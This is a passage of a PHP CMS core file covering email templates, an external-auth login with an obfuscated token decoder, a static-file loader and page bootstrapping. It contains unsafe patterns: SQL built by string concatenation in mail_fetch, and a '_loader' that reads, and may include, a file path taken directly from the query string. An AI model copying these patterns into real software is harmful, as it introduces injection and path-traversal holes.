			$params = $debug;
			$debug  = false;
		}
		if(!is_array($content))	$r_text[] = $content;
		else	$r_text = $content;
		if ( $debug )	echo "HASIL PARSING";
		foreach($r_text AS $id => $text)
		{
			preg_match_all( $regex, $text, $match );
			if ( $debug )
			{
				echo '<br />'.$id.' :';
				pr( $match[1] );
			}
			$replace	= array();
			if(isset($params))
			{
				foreach( $match[1] as $val)
				{
					$replace[] = ( isset($params[$val]) ) ? $params[$val] : $val;
				}
			}else{
				foreach( $match[1] as $val)
				{
					$replace[] = ( isset($GLOBALS[$val]) ) ? $GLOBALS[$val] : $val;
				}
			}
			if ( $debug )	pr( $replace );
			$pattern = array();
			foreach( $match[1] as $val)
			{
				$pattern[] = "#\[$val\]#";
			}
			$r_temp[$id] = preg_replace( $pattern, $replace, $text );
		}
		if(!is_array($content))	$output = $r_temp[0];
		else	$output = $r_temp;
		return $output;
	}

	public function mail_fetch( $name, $module_id = '' )
	{
		global $_CONFIG;
		$module_id = is_int($module_id) ? $module_id : $this->module_id;
		$q="SELECT * FROM `bbc_email` AS e LEFT JOIN `bbc_email_text` AS t ON (e.`id`=t.`email_id` AND `lang_id`=".lang_id().")
		WHERE LOWER(`name`)='".strtolower($name)."' AND `module_id`=".$module_id;
		$out	= $this->db->cacheGetRow( $q );
		if ($out)
		{
			$out['email']        = @$out['global_email'] ? $_CONFIG['email']['address'] : $out['from_email'];
			$out['name']         = @$out['global_email'] ? $_CONFIG['email']['name'] : $out['from_name'];
			$out['pre_subject']  = @$out['global_subject'] ? $_CONFIG['email']['subject'] : '';
			$out['post_content'] = @$out['global_footer'] ? $_CONFIG['email']['footer'] : '';
		}else
		if($this->debug)
		{
			die('Email Template: "'.$name.'" is not found...');
		}
		return $out;
	}

	public function mail_send($to, $email_tpl, $debug = false)
	{
		_func('sendmail');
		if(@$this->email['template'] != $email_tpl)
		{
			$this->email['temp']		= $this->mail_fetch( $email_tpl, $this->module_id );
			$this->email['template']= $email_tpl;
		}
		$template            = $this->text_replace($this->email['temp'], $debug);
		$template['param']   = array( 'IsHTML'=> ($this->email['temp']['is_html'] ? true : false));
		$template['from']    = array('from' => $template['email'], 'from_name'=> $template['name']);
		$template['subject'] = $this->email['temp']['pre_subject'].' '.$template['subject'];
		$template['content'].= "\n".$this->email['temp']['post_content'];

		sendmail($to,
			$template['subject'],
			$template['content'],
			array($template['from_email'],$template['from_name']),
			$template['param']
			);
	}
	public function clean_cache()
	{
		$this->cache_clear = true;
	}
	public function login($sitename = '', $redirect='')
	{
		$sitename = strtolower(preg_replace('~[^a-z]~is', '', $sitename));
		if(!isset($_GET['authcode']))
		{
			$regex    = array('~[\?&]+authtime=[^\?&]+~s', '~[\?&]+authcode=.*?$~s');
			$replacer = array('', '');
			if(empty($redirect))
			{
				$redirect = seo_url();
				$redirect	= preg_replace($regex, $replacer, $redirect);
			}else{
				$redirect	= preg_replace($regex, $replacer, $redirect);
			}
			$_SESSION[_URI.'auth_login'] = array('redirect' => $redirect);
			redirect("https://auth.fisip.net/".$sitename.'?redirect='.urlencode($redirect).'&authtime='.time());
		}else{
			$key = 'vdhReZsoW0EVTt4Ykcbm7CjrPDJO3Lu21f6waHAgQFplny98qIBSUGz5xMiNX+K/';
			$str = urldecode(preg_replace('~0([2-4][A-F])~s','%\1',$_GET['authcode']));
			$str = @gzinflate(base64_decode(strtr($str, $key, strrev($key))));
			$str = @gzinflate(base64_decode(strtr($str, strrev($key), $key)));
			$out = '';
			$len = strlen($str);
			for($i=0;$i < $len;$i++)
			{
				if($i%2)
				{
					$out .= substr($str, $i, 1);
				}
			}
			$out = json_decode(strtr($out, $key, strrev($key)),1);
			if(empty($out) || time() > @intval($out['authtime']))
			{
				unset($_GET['authcode']);
				return $this->login($sitename, @$_SESSION[_URI.'auth_login']['redirect']);
			}else{
				if($out['auth'] != $sitename)
				{
					unset($_GET['authcode']);
					return $this->login($sitename, @$_SESSION[_URI.'auth_login']['redirect']);
				}
			}
			$_SESSION[_URI.'auth_login'] = array();
			unset( $_SESSION[_URI.'auth_login'], $out['authtime']);
			return $out;
		}
	}
}
// Jika _GZIP belum ada maka buat dengan nilai 1
if (!defined('_GZIP'))
{
	define('_GZIP', 1);
}
function bbcsystem_header($mime = 'text/html')
{
	if (!headers_sent())
	{
		if (_GZIP && substr_count(@$_SERVER['HTTP_ACCEPT_ENCODING'], 'gzip'))
		{
			if (extension_loaded('zlib') && !ini_get('zlib.output_compression'))
			{
				header('Content-Encoding: gzip');
				ob_start('ob_gzhandler');
			}
		}
		header('content-type: '.$mime.'; charset: UTF-8');
		header('cache-control: must-revalidate');
		$offset = 60 * 60 * 24 * 365;
		$expire = 'expires: ' . gmdate('D, d M Y H:i:s', time() + $offset) . ' GMT';
		header($expire);
	}
}
if(!empty($_GET['_loader']))
{
	$_str = _ROOT.preg_replace('~^'._URI.'~is', '', $_GET['_loader']);
	if(file_exists($_str))
	{
		$r = array(
			'css'  => 'text/css',
			'js'   => 'text/javascript',
			'swf'  => 'application/x-shockwave-flash',
			'bmp'  => 'image/bmp',
			'gif'  => 'image/gif',
			'jpeg' => 'image/jpeg',
			'jpg'  => 'image/jpeg',
			'jpe'  => 'image/jpeg',
			'png'  => 'image/png',
			'tiff' => 'image/tiff',
			'tif'  => 'image/tiff'
			);
		preg_match('~\.([a-z]+)$~is', $_str, $m);
		if(!empty($r[$m[1]]))
		{
			bbcsystem_header($r[$m[1]]);
			if(preg_match('~templates/script\.js$~s', $_str))
			{
				echo 'var _ROOT = "'._URI.'";var _URL = "'._URL.'";';
			}
			if (function_exists('file_get_contents'))
			{
				echo file_get_contents($_str);
			}else{
				if ($fp = @fopen($_str, 'r'))
				{
					flock($fp, LOCK_SH);
					$data = '';
					if (filesize($_str) > 0)
					{
						$data =& fread($fp, filesize($_str));
					}
					flock($fp, LOCK_UN);
					fclose($fp);
					echo $data;
				}else{
					include $_str;
				}
			}
			die();
		}
	}
}
/*=========================================
* START ACTION...
*=======================================*/
ob_start();
chdir($Bbc->currDir);
$Bbc->debug			= array();
$Bbc->autoload	= array();
$Bbc->url_prefix= '';
include_once _ROOT.'_function.php';
include_once _ROOT.'_setting.php';
$Bbc->autoload = array_merge_recursive($Bbc->autoload, (array)$Bbc->load);
if(_ADMIN != '')
{
	include_once _ROOT._ADMIN.'_setting.php';
	if(isset($Bbc->load) && is_array($Bbc->load))
	{
		$Bbc->autoload = array_merge_recursive($Bbc->autoload, (array)$Bbc->load);
	}
}
$Bbc->load = false;
foreach((array)$Bbc->autoload AS $Bbc_load_act => $Bbc_load_file)
{
	switch($Bbc_load_act)
	{
		case 'func':
			foreach($Bbc_load_file AS $f) _func($f);
		break;
		case 'class':
			foreach($Bbc_load_file AS $c) _class($c);
		break;
		case 'lib':
			foreach($Bbc_load_file AS $l) _lib($l);
		break;
		case 'sys':
			foreach($Bbc_load_file AS $s){ _ext($s); include_once _SYS.$s;}
		break;
	}
}
$user->is_login = !empty($user->id) ? 1 : 0;
$tpl            = @$_CONFIG['template'];
$_CONFIG        = get_config(0);
if (!empty($tpl))
{
	$_CONFIG['template'] = $tpl;
}
$xz  = $_CONFIG['site']['debug'] = (ini_get('display_errors') ? 1 : 0);
$sys = new bbcSystem();
foreach((array)@$Bbc->debug AS $x => $z)
{
	if($x > 0)
	{
		$GLOBALS['db'.$x]->debug = $xz;
	}else{
		$GLOBALS['db']->debug = $xz;
	}
}
unset($Bbc_load_act, $Bbc_load_file,$xz, $x, $z);

include_once _SYS.'layout.modules.php';
if (is_array($Bbc->debug))
{
	$delimeter  = (count($Bbc->debug) > 1) ? '<hr /><hr />' : '';
	$Bbc->debug = implode($delimeter, $Bbc->debug);
}
if (file_exists($sys->layout))
{
	include_once $sys->layout;
}else{
	echo 'Invalid Template Path: '.$sys->layout;
}
$o = ob_get_contents();
ob_end_clean();
if(@include _ROOT.'../replace.php')
{
	if(!empty($xchange[$_SERVER['HTTP_HOST']]))
	{
		$arr = $xchange[$_SERVER['HTTP_HOST']];
		$o = strtr($o, $arr);
	}
}
bbcsystem_header();
echo preg_replace('~(\ssrc=["|\']?)(blocks|images|includes|modules|templates)/~is', '$1'._URL.'$2/', $o);